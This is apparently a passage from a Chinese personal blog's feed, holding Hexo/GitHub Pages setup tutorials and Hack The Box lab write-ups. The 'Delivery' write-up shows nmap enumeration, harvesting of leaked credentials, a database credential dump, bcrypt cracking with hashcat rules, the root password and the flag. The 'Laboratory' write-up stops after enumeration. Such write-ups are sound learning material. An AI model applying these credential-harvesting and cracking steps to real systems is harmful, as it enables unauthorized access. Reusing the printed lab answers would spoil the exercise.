<h2 id="4-配置本机全局git环境"><a href="#4-配置本机全局git环境" class="headerlink" title="4.配置本机全局git环境"></a>4.配置本机全局git环境</h2><p>假设我的邮箱是<a href="mailto:&#x74;&#x6f;&#109;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x74;&#x6f;&#109;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a>,github的名字是tom</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.email “tom@gmail.com” </span><br><span class="line">git config --global user.name “tom”</span><br></pre></td></tr></table></figure>
<h2 id="5-生成ssh密钥"><a href="#5-生成ssh密钥" class="headerlink" title="5.生成ssh密钥"></a>5.生成ssh密钥</h2><p>命令端输入,生成ssh密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C tom@gmail.com</span><br></pre></td></tr></table></figure>
<p>会提示让你输入文件夹的名字来存放ssh秘钥，并且让你确认一个验证的密码，按要求操作就好了。然后输入下面命令查看ssh密钥文件中的公钥内容.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">less ~&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>
<h2 id="6-创建博客工程"><a href="#6-创建博客工程" class="headerlink" title="6.创建博客工程"></a>6.创建博客工程</h2><p>建一个新的仓库，假设你的用户名是tom，那么你生成的这个工程命名必须为<a href="mailto:&#x74;&#x6f;&#109;&#64;&#x67;&#105;&#116;&#x68;&#117;&#x62;&#46;&#x69;&#x6f;">&#x74;&#x6f;&#109;&#64;&#x67;&#105;&#116;&#x68;&#117;&#x62;&#46;&#x69;&#x6f;</a>。(下图中是我个人的github用户名,为wxt406611016)<br><img src="https://s2.ax1x.com/2019/02/08/kNeuJ1.png" alt="本例中用户名为wxt406611016"><br>其他的按照默认配置就可以,然后点击Create repository创建.</p>
<p><strong>然后将你的ssh密钥添加到你的github中</strong><br>在你的github页面依次点击Settings-&gt;SSH and GPG keys-&gt;New SSH key,将第五步中的公钥内容复制到Key里,点击Add SSH key.(如下图)<br><img src="https://s2.ax1x.com/2019/02/08/kNeeo9.png" alt="添加页面"></p>
<h2 id="7-在hexo中配置git"><a href="#7-在hexo中配置git" class="headerlink" title="7.在hexo中配置git"></a>7.在hexo中配置git</h2><p>在blog文件夹下的 config.yml文件中配置你的git,添加以下代码.<br>注意代码中的xxx为你的github的用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: ssh:&#x2F;&#x2F;git@github.com&#x2F;xxx&#x2F;xxx.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<h2 id="8-将本地文件上传到github"><a href="#8-将本地文件上传到github" class="headerlink" title="8.将本地文件上传到github"></a>8.将本地文件上传到github</h2><p>先安装hexo deploy插件,输入以下代码.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>最后将本地文件编译后上传到github上,在终端输入以下代码.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g          #生成静态文件</span><br><span class="line">hexo d          #上传部署网站</span><br></pre></td></tr></table></figure>

<p><strong>大功告成了,github+hexo搭建的个人博客就完成了,快在浏览器中输入xxx.github.io(xxx为你github的账户名)来看看你的博客吧</strong></p>
<p><strong><em>关于如何更改主题,查看下一片文章点击</em></strong><a href="https://wxt406611016.github.io/2019/02/01/github+hexo%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98/">–github+hexo更换主题</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>github+hexo更换主题:indigo</title>
    <url>/2019/02/08/github+hexo%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98/</url>
    <content><![CDATA[<h1 id="github-hexo更换主题"><a href="#github-hexo更换主题" class="headerlink" title="github+hexo更换主题:"></a>github+hexo更换主题:</h1><p>上一篇写了关于github+hexo搭建个人博客的过程,搭建成功后页面主题是默认主题,但其实有很多主题可供选择,这篇文章就主要学习一下如何更换主题,以及更换主题后如何丰富优化功能,如评论功能,站内搜索功能.</p>
<a id="more"></a>
<h2 id="1-查看并选择主题"><a href="#1-查看并选择主题" class="headerlink" title="1.查看并选择主题"></a>1.查看并选择主题</h2><p>主题当然不用自己开发,这涉及到很多前端知识很复杂,而在hexo官网上,就有themes栏,有已经开发完成的主题可供选择.<a href="https://hexo.io/themes/">(点击选择主题to themes)!</a><br><img src="https://s2.ax1x.com/2019/02/08/kNmp0e.png" alt="hexo主题页面"><br> 可以看到有很多主题可以选择,点击图片可以进入预览模式,选择完成后,返回主题页面,点击主题名(如上图中,点击”一个男孩”字样),即可进入开发者的github页面.本例中,我们以indigo为例,页面如下图所示,也可点击图片下方”进入indigo预览”进入预览模式.<br> <img src="https://s2.ax1x.com/2019/02/08/kNmSmD.png" alt="indigo页面"><br> <a href="https://www.imys.net/">(进入indigo预览)</a><br> 然后我们进入对应开发者的github页面.<a href="https://github.com/yscoder/hexo-theme-indigo">(进入开发者github)</a></p>
<h2 id="2-从github-clone-indigo主题"><a href="#2-从github-clone-indigo主题" class="headerlink" title="2.从github clone indigo主题"></a>2.从github clone indigo主题</h2><p>进入开发者github页面后,点击”clone or download”,选择use ssh,会出现git命令,复制该命令到终端并运行.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:yscoder&#x2F;hexo-theme-indigo.git</span><br></pre></td></tr></table></figure>
<p>(速度可能较慢,还记得上篇提到的翻墙git吗,速度快很多)<br>将clone下来的文件夹放入hexo下themes文件夹下.<br>clone后,需要安装主题需要的依赖.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-less --save    #安装less,作为css的预处理工具 </span><br><span class="line">npm install hexo-generator-feed --save    #安装rss的feed生成工具 </span><br><span class="line">npm install hexo-generator-json-content --save    #用于生成静态站点数据，用于站内搜索的数据源 </span><br><span class="line">npm install hexo-helper-qrcode --save    #用于生成微信分享二维码</span><br></pre></td></tr></table></figure>
<h2 id="3-修改-config-yml-使用indigo主题"><a href="#3-修改-config-yml-使用indigo主题" class="headerlink" title="3.修改_config.yml,使用indigo主题"></a>3.修改_config.yml,使用indigo主题</h2><p>打开_config.yml,将主题更改,如以下代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https:&#x2F;&#x2F;hexo.io&#x2F;plugins&#x2F;</span><br><span class="line">## Themes: https:&#x2F;&#x2F;hexo.io&#x2F;themes&#x2F;</span><br><span class="line">theme: hexo-theme-indigo</span><br></pre></td></tr></table></figure>
<h2 id="4-调整修改个人信息"><a href="#4-调整修改个人信息" class="headerlink" title="4.调整修改个人信息"></a>4.调整修改个人信息</h2><p> _config.yml的author改成自己,title改为自己想展示的内容， themes/indigo/_config.yml里的email改成自己的邮箱,title_change改成自己想展示的,头像avater可以自行调整图片路径,menu可以自行修改调整.下面是我个人调整的代码,根据需要调整修改.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home:</span><br><span class="line">    url: &#x2F;</span><br><span class="line">  archives:</span><br><span class="line">    url: &#x2F;archives</span><br><span class="line">  tags:</span><br><span class="line">     text: CUMT</span><br><span class="line">     url: http:&#x2F;&#x2F;cs.cumt.edu.cn&#x2F;</span><br><span class="line">     target: _blank</span><br><span class="line">  github:</span><br><span class="line">    url: https:&#x2F;&#x2F;github.com&#x2F;xxxxx</span><br><span class="line">    target: _blank</span><br><span class="line">  weibo:</span><br><span class="line">    url: https:&#x2F;&#x2F;weibo.com&#x2F;xxxxx</span><br><span class="line">    target: _blank</span><br><span class="line"># 你的头像url</span><br><span class="line">avatar: &#x2F;img&#x2F;host.jpg</span><br><span class="line"># 动态定义title</span><br><span class="line">title_change:</span><br><span class="line">  normal: Welcome My Blog</span><br><span class="line">  leave: Welcome</span><br></pre></td></tr></table></figure>
<h2 id="5-增加评论功能-valine"><a href="#5-增加评论功能-valine" class="headerlink" title="5.增加评论功能:valine"></a>5.增加评论功能:valine</h2><p>有很多评论系统,本例中我们选择valine,这个评论系统是基于LeanCloud的，大家应该对这个很熟悉，官网网址如下，<a href="https://leancloud.cn/">LeanCloud官网</a>,需要注册一个账户。<br>注册完成后登录,依次点击设置-&gt;应用Key,得到App ID和App Key,<br>打开themes/indigo/_config.yml,因为该主题集成了valine方法,所以直接修改valine对应的参数就可以了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">valine:</span><br><span class="line">  enable: true       # 如果你想使用valine，请将值设置为 true</span><br><span class="line">  appId: xxxxxxxxxxxxxxxxxxxxxxx               #在应用Key里得到的App ID</span><br><span class="line">  appKey: xxxxxxxxxxxxxxxxxxxxxx             #在应用Key里得到的App Key</span><br><span class="line">  notify: false      # Mail notify</span><br><span class="line">  verify: false      # Verify code</span><br><span class="line">  avatar: mm      # Gravatar style : mm&#x2F;identicon&#x2F;monsterid&#x2F;wavatar&#x2F;retro&#x2F;hide</span><br><span class="line">  placeholder: 说点什么吧!(别忘了先填写上面的昵称哦)        # Comment Box placeholder</span><br><span class="line">  guest_info: nick       # Comment header info</span><br><span class="line">  pageSize: 10       # comment list page size</span><br></pre></td></tr></table></figure>
<p>登录你的LeanCloud页面,依次点击设置-&gt;安全中心,在Web安全域名下添加你的github博客网址,如下图<br><img src="https://s2.ax1x.com/2019/02/08/kNmFfI.png" alt="本图中github账户名为wxt406611016"></p>
<h2 id="6-将本地文件重新上传到github"><a href="#6-将本地文件重新上传到github" class="headerlink" title="6.将本地文件重新上传到github"></a>6.将本地文件重新上传到github</h2><p>最后将本地文件编译后上传到github上,在终端输入以下代码.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean   #清除缓存文件</span><br><span class="line">hexo g          #生成静态文件</span><br><span class="line">hexo d          #上传部署网站</span><br></pre></td></tr></table></figure>

<p><strong>ok,主题更换完成,评论功能也添加,继续打造属于你自己的博客吧!</strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>github之hexo源码备份和应用</title>
    <url>/2020/11/09/github%E4%B9%8Bhexo%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E5%92%8C%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p>对于写博客的人来说，换电脑时如何迁移博客是比较头疼的，本文介绍了利用git分支保存hexo博客源码的方法，当换电脑时只需要将hexo源码git下来即可。</p>
<a id="more"></a>
<h1 id="1-使用git分支保存hexo博客源码"><a href="#1-使用git分支保存hexo博客源码" class="headerlink" title="1.使用git分支保存hexo博客源码"></a>1.使用git分支保存hexo博客源码</h1><p>具体操作请<a href="https://zhuanlan.zhihu.com/p/133860750">跳转到页面。</a></p>
<h1 id="2-为新电脑添加SSH-keys"><a href="#2-为新电脑添加SSH-keys" class="headerlink" title="2.为新电脑添加SSH keys"></a>2.为新电脑添加SSH keys</h1><p>当你需要在一台新设备上继续写博客上，可以通过github的源码来快速搭建原环境，为了能够使用git clone、push等操作，需要在新电脑上设置github环境，并将SSH keys存储到github中，具体操作请跳转到<a href="https://wxt406611016.github.io/2019/02/07/github+hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">我之前的一篇博客</a>中4，5，6节部分。</p>
<h1 id="3-将hexo源码clone到本地"><a href="#3-将hexo源码clone到本地" class="headerlink" title="3.将hexo源码clone到本地"></a>3.将hexo源码clone到本地</h1><p>新设备空空如也，需要将hexo源码克隆到本地，具体操作也在第一步的文档中，<a href="https://zhuanlan.zhihu.com/p/133860750">跳转！</a></p>
<h1 id="4-配置hexo所需环境"><a href="#4-配置hexo所需环境" class="headerlink" title="4.配置hexo所需环境"></a>4.配置hexo所需环境</h1><p>将源码clone到本地还不够，还需要配置hexo所需环境，如nodejs，npm。。。这里我们使用nvm来安装，具体操作也在第二步的文档中，<a href="https://zhuxiaoxia.blog.csdn.net/article/details/88855256?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.compare&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.compare">跳转！</a>中从第2节开始看。</p>
<h1 id="5-Deploy和Push"><a href="#5-Deploy和Push" class="headerlink" title="5.Deploy和Push"></a>5.Deploy和Push</h1><p>到这一步基本都配置好了，需要测试使得</p>
<ol>
<li><p>hexo d操作能部署博客到github博客仓库的显示分支，_config.yml中默认将hexo d部署到master分支，所以不用修改，直接hexo g，hexo d一顿操作就完事儿了，如果想在本地先调试，就在hexo g后跟一个hexo s。</p>
</li>
<li><p>git push操作能将博客源码更新到github博客仓库的源码分支，</p>
<ol>
<li><p>(可选)如果你是从github上clone下来的源代码，则不需要本步骤。否则的话先本地关联远程仓库：</p>
<p> <code>git remote add origin git@github.com:yourblog/yourblog.github.io.git</code></p>
</li>
<li><p>接着git三部曲就完事儿了:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .    #添加所有文件到暂存区</span><br><span class="line">git commit -m &quot;date&quot;     #提交，标记我此处用了date字符串</span><br><span class="line">git push origin source     #推送到源码分支source</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB[Delivery]</title>
    <url>/2021/03/07/htb%5BDelivery%5D/</url>
    <content><![CDATA[<p>小白初学渗透测试，使用hack the box平台，注册方法以及使用方法网上已经很多教程了，就不再赘述了，百度或者google即可。本题路径为：Labs-Machines-Delivery，这道题有点儿社工的味道，需要认真看website上的内容。</p>
<a id="more"></a>

<hr>
<h2 id="1-System-Scan"><a href="#1-System-Scan" class="headerlink" title="1.System Scan"></a>1.System Scan</h2><p>使用nmap扫描主机，查看开放了哪些端口和服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo nmap -sS -sV -sC -p- 10.10.10.222 </span><br><span class="line">----------------------------------------</span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-07 23:28 CST</span><br><span class="line">Nmap scan report for delivery.htb (10.10.10.222)</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)</span><br><span class="line">|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)</span><br><span class="line">|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx&#x2F;1.14.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">8065&#x2F;tcp open  unknown</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>从扫描的结果可以看出，开放了如下端口和服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22:ssh</span><br><span class="line">80:web</span><br><span class="line">8065:unknown</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="2-Enumeration-Web-Site"><a href="#2-Enumeration-Web-Site" class="headerlink" title="2.Enumeration: Web Site"></a>2.Enumeration: Web Site</h2><p>接下来就先从80端口入手，访问10.10.10.222:80，</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210307233250.png" alt="20210307233250"></p>
<p>首页存在一个可疑链接，CONTACT US页面也存在一个可疑链接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HELPDESK: http:&#x2F;&#x2F;helpdesk.delivery.htb&#x2F;</span><br><span class="line">MatterMost server：http:&#x2F;&#x2F;delivery.htb:8065&#x2F;</span><br></pre></td></tr></table></figure>
<p>并且CONTACT US页面的内容有提示，需要获得一个@delivery.htb邮箱，才能访问MatterMost服务，这很重要：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308100205.png" alt="20210308100205"></p>
<p>继续查看链接对应页面，但是链接并打不开，由于.htb不是真正的顶级域名，而且8065是未知服务，所以能够合理假设这些服务是主机本地的，可以通过修改/etc/hosts来更改dns解析，打开hosts文件并添加：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.222  delivery.htb</span><br><span class="line">10.10.10.222  helpdesk.delivery.htb</span><br></pre></td></tr></table></figure>
<p>( 我刚开始疑惑为什么两个域名都解析到同一个ip，却得到不同的页面，后来想到nginx可以实现多域名对应的多服务绑定在同一个ip上，通过域名来访问不同服务，这个题应该也是这样的。可以最后打通后看看nginx的配置文件验证下。)</p>
<p>现在依次访问 <a href="http://helpdesk.delivery.htb/">http://helpdesk.delivery.htb/</a> 和 <a href="http://delivery.htb:8065/">http://delivery.htb:8065/</a> ，发现两个运行的web服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HelpDesk: osTicket Support Ticket System</span><br><span class="line">MatterMost: 是一种开源的，可自托管的在线聊天服务，用于公司内部的聊天。</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="3-Enumeration-MatterMost"><a href="#3-Enumeration-MatterMost" class="headerlink" title="3.Enumeration: MatterMost"></a>3.Enumeration: MatterMost</h2><p>先从MatterMost入手，在ExploitDB上没有发现MatterMost的相关漏洞，然后看一下website页面上的内容，点击Create one now，尝试注册一个新账号，但是需要邮箱验证，但是注册时填写的邮箱又收不到验证邮件(应该时HTB上的机器无法向外发送邮件)：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308095103.png" alt="20210308095103"></p>
<hr>
<h2 id="4-Enumeration-Help-Desk"><a href="#4-Enumeration-Help-Desk" class="headerlink" title="4.Enumeration: Help Desk"></a>4.Enumeration: Help Desk</h2><p>打开 <a href="http://helpdesk.delivery.htb/">http://helpdesk.delivery.htb/</a> 尝试从HelpDesk页面取得突破，这个服务看起来是由osTicket’s Support Ticket System提供的，是广泛使用且值得信赖的开源支持票务系统。</p>
<p>尝试创建一个用户，点击Open a New Ticket，按照提示，完成注册：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308100724.png" alt="20210308100724"></p>
<p>!!!惊喜，发现我们得到了一个@delivery.htb邮箱，想到在第二步中CONTACT US页面的内容了吗，我们可以用这个邮箱去通过MatterMost的验证，点击View Ticket Thread，使用注册时的邮箱和注册成功后的ticket id登录；</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308101312.png" alt="20210308101312"></p>
<hr>
<h2 id="5-Accessing-MatterMost"><a href="#5-Accessing-MatterMost" class="headerlink" title="5.Accessing MatterMost"></a>5.Accessing MatterMost</h2><p>既然得到了@delivery.htb的邮箱，可以继续突破MatterMost了，使用该邮箱注册MatterMost：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308101652.png" alt="20210308101652"></p>
<p>注册成功时提示去验证邮箱，然后去HelpDesk服务页面刷新View Ticket Thread，即可看到验证链接：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308101831.png" alt="20210308101831"></p>
<p>验证链接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;delivery.htb:8065&#x2F;do_verify_email?token&#x3D;mbke8qepod1htgm4ttpptfbmsp4ecucq1hkdwt4r6i5jwpdi3ocq7a1itzp68any&amp;email&#x3D;6236837%40delivery.htb</span><br></pre></td></tr></table></figure>
<p>点击后即提示Email Verified，然后根据注册时的账户密码登录即可，</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308105836.png" alt="20210308105836"></p>
<p>这个图里的聊天内容部分有两个关键信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Credentials to the server are maildeliverer:Youve_G0t_Mail! </span><br><span class="line">stop re-using the same passwords everywhere.... Especially those that are a variant of &quot;PleaseSubscribe!&quot;</span><br></pre></td></tr></table></figure>
<p>可以通过ssh credentials登录该主机,目标对象为<a href="mailto:&#x6d;&#97;&#x69;&#108;&#100;&#x65;&#x6c;&#x69;&#x76;&#x65;&#x72;&#x65;&#114;&#x40;&#49;&#48;&#46;&#49;&#48;&#x2e;&#49;&#48;&#46;&#50;&#50;&#50;">&#x6d;&#97;&#x69;&#108;&#100;&#x65;&#x6c;&#x69;&#x76;&#x65;&#x72;&#x65;&#114;&#x40;&#49;&#48;&#46;&#49;&#48;&#x2e;&#49;&#48;&#46;&#50;&#50;&#50;</a>,密码为Youve_G0t_Mail!</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308112512.png" alt="20210308112512"></p>
<p>登录成功，但这只是普通用户，得想办法搞搞root用户。</p>
<hr>
<h2 id="6-Privilege-Escalation"><a href="#6-Privilege-Escalation" class="headerlink" title="6.Privilege Escalation"></a>6.Privilege Escalation</h2><p>切换root账户需要密码无法直接登录，得另寻办法了。利用netstat查看运行的服务，发现3306端口被占用，即mysql在运行:</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308200457.png" alt="20210308200457"></p>
<p>可以理解，ticketing system需要一种方式存取数据，并且MatterMost应该也用到了mysql，需要找到数据库的登录凭证。</p>
<p>经查阅资料MatterMost的配置文件在/opt/mattermost/config/config.json，其中SqlSetting中包含MySQL的登录凭证信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308211057.png" alt="20210308211057"></p>
<p>发现用户名、密码、数据库名信息，数据库名为mattermost，登录数据库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u mmuser -p</span><br><span class="line">password: Crack_The_MM_Admin_PW</span><br></pre></td></tr></table></figure>
<p>在mattermost数据库下的Users表中发现关键信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308211516.png" alt="20210308211516"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root : $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO</span><br></pre></td></tr></table></figure>
<p>虽然这个root用户是MatterMost账户里名为root的用户，但根据第5步中得到的聊天内容中的re-using可以合理猜测主机的root用户也是该密码。</p>
<hr>
<h2 id="7-Cracking-the-Password-with-hashcat"><a href="#7-Cracking-the-Password-with-hashcat" class="headerlink" title="7.Cracking the Password with hashcat"></a>7.Cracking the Password with hashcat</h2><p>拿到了root用户的密码hash值后，可以使用hashcat进行破解。在破解之前，首先需要知道加密方式和密码字典等信息，还记得第5步中得到的聊天内容的关键信息吗：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Credentials to the server are maildeliverer:Youve_G0t_Mail! </span><br><span class="line">stop re-using the same passwords everywhere.... Especially those that are a variant of &quot;PleaseSubscribe!&quot;</span><br></pre></td></tr></table></figure>
<p>可以使用hashcat基于规则的攻击，且<code>PleaseSubscribe!</code>作为单词表，接下来可以开始攻击破解密码：</p>
<ul>
<li>Identifying the Hash Type<ul>
<li>首先需要确定加密方式，可以使用kali自带的<code>hashid</code>得到加密方式为bcrypt：<br><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308212526.png" alt="20210308212526"><br>查阅资料bcrypt在hashcat中对应的模式为3200。</li>
</ul>
</li>
<li>Hashcat Rules<ul>
<li>基于规则的攻击是所有攻击模式中最复杂的一种。因为基于规则的攻击就像是用于生成密码候选者的编程语言。这里直接用github的开源规则：<a href="https://github.com/praetorian-inc/Hob0Rules">https://github.com/praetorian-inc/Hob0Rules</a> ，将文件git下来即可。</li>
</ul>
</li>
<li>Putting It All Together<ul>
<li>利用hashcat进行破解： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 3200 hash.txt wordlist.txt -r Hob0Rules&#x2F;d3adhob0.rule -o cracked.txt -w 3 -O</span><br><span class="line"></span><br><span class="line">-a 0：表示攻击模式，表示使用规则生成的所有密码空间</span><br><span class="line">-m 3200：表示使用bcrypt加密方式</span><br><span class="line">hash.txt：文本内容为需要被破解的哈希值</span><br><span class="line">wordlist.txt：表示破解需要使用的字典，如PleaseSubscribe!</span><br><span class="line">-r Hob0Rules&#x2F;d3adhob0.rule：指明使用的规则</span><br><span class="line">-o cracked.txt：表明输出结果</span><br></pre></td></tr></table></figure>
 经过半个小时后得到密码<code>PleaseSubscribe!21</code>：<br> <img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308213650.png" alt="20210308213650"></li>
</ul>
</li>
</ul>
<hr>
<h2 id="8-Owning-Root"><a href="#8-Owning-Root" class="headerlink" title="8.Owning Root"></a>8.Owning Root</h2><p>破解出了MatterMost账户里名为root的用户的密码，猜测主机密码也是这个，从maildeliverer用户切换到root用户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su - root</span><br><span class="line">password: PleaseSubscribe!21</span><br></pre></td></tr></table></figure>
<p>登录root用户后，在当前目录读root.txt的内容，得到flag:<code>2994a60a63ea6d88fbae4266b3787553</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210308215745.png" alt="20210308215745"></p>
<hr>
<p>Now it’s time to party!</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB[Laboratory]</title>
    <url>/2021/03/14/htb%5BLaboratory%5D/</url>
    <content><![CDATA[<p>小白初学渗透测试，使用hack the box平台，注册方法以及使用方法网上已经很多教程了，就不再赘述了，百度或者google即可。本题路径为:Labs-Machines-Laboratory，又是学知识的一天。</p>
<a id="more"></a>

<hr>
<h2 id="1-System-Scan"><a href="#1-System-Scan" class="headerlink" title="1.System Scan"></a>1.System Scan</h2><p>使用nmap扫描主机，查看开放了哪些端口和服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo nmap -T4 -sV -A -O 10.10.10.216 </span><br><span class="line">----------------------------------------</span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-14 13:19 CST</span><br><span class="line">Nmap scan report for laboratory.htb (10.10.10.216)</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)</span><br><span class="line">|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)</span><br><span class="line">|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)</span><br><span class="line">80&#x2F;tcp  open  http     Apache httpd 2.4.41</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to https:&#x2F;&#x2F;laboratory.htb&#x2F;</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;http Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;laboratory.htb</span><br><span class="line">| Subject Alternative Name: DNS:git.laboratory.htb</span><br><span class="line">| Not valid before: 2020-07-05T10:39:28</span><br><span class="line">|_Not valid after:  2024-03-03T10:39:28</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>从扫描的结果可以看出，开放了如下端口和服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22:ssh</span><br><span class="line">80:http -- redirect to https:&#x2F;&#x2F;laboratory.htb&#x2F;</span><br><span class="line">443:https -- DNS:git.laboratory.htb</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="2-Enumeration-Web-Site"><a href="#2-Enumeration-Web-Site" class="headerlink" title="2.Enumeration: Web Site"></a>2.Enumeration: Web Site</h2><p>接下来就先从80端口入手，访问10.10.10.216:80，跳转到 <a href="https://laboratory.htb/">https://laboratory.htb/</a> ，显示找不到此网站，猜测服务是主机本地的，需要更改dns解析，和上一题Delivery一样，修改/etc/hosts文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.216 laboratory.htb</span><br><span class="line">10.10.10.216 git.laboratory.htb</span><br></pre></td></tr></table></figure>
<p>接下来访问 <a href="https://laboratory.htb/">https://laboratory.htb</a> ，在评论那里看到Dexter用户，是Laboratory的CEO，猜测该用户账户中存在秘密，想方设法登入该用户。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314133046.png" alt="20210314133046"></p>
<p>再访问另一个站点 <a href="https://git.laboratory.htb/">https://git.laboratory.htb</a> ，是gitlab的登录注册页面：</p>
